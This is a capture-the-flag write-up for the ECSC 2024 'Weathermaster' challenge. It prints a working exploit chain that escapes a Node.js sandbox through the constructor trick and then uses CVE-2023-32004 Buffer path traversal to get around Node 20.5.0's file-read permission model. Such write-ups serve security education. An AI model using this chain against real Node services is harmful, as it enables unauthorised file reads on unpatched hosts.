# Weathermaster

> I've found this weather station online - it has an open TCP port with no authentication, but there's also nothing particularly interesting on it, or do you think there might be something?
>
> `nc weathermaster.ecsc24.hack.cert.pl 5105`

## Solution
The "execute code" option has an interesting behaviour when you try to `print()`:
```
>> ! print("pwned")
! print("pwned")
pwned
undefined
```
`undefined` suggests the use of JavaScript. Let's try printing `this`:
```
>> ! this
! this
{ print: [Function: log] }
```
The only global object is the function `print`, so we're in some sort of a jail. Escaping these in JS is usually not that hard - turns out it is possible to easily print the process information by using `! this.constructor.constructor('return this.process')()`. We can read some interesting information from that, e.g. Node version is 20.5.0 and the program is executed with the following arguments:
```
argv: [ '/usr/local/bin/node', '/app/index.js' ],
execArgv: [ '--experimental-permission', '--allow-fs-read=/app/*' ]
```
The experimantal API that allows only reading files from specific directories (`/app` in this case) is used. Luckily, as we can read e.g. [here](https://nodejs.org/en/blog/vulnerability/august-2023-security-releases), Node 20.5.0 is affected by CVE-2023-32004, so we can bypass this check by doing path traversal in a `Buffer` object instead of a normal string. The exploit is pretty straightforward:
```
>> ! let process = this.constructor.constructor('return this.process')()
! let process = this.constructor.constructor('return this.process')()
undefined
>> ! let require = process.mainModule.require
! let require = process.mainModule.require
undefined
>> ! let Buffer = require('buffer').Buffer
! let Buffer = require('buffer').Buffer
undefined
>> ! let fs = require('fs')
! let fs = require('fs')
undefined
>> ! let path = Buffer.from('/app/../flag.txt')
! let path = Buffer.from('/app/../flag.txt')
undefined
>> ! fs.readFileSync(path).toString()
! fs.readFileSync(path).toString()
ecsc24{whats_th3_f0recast_f0r_nodejs?}
```

## Flag
`ecsc24{whats_th3_f0recast_f0r_nodejs?}`
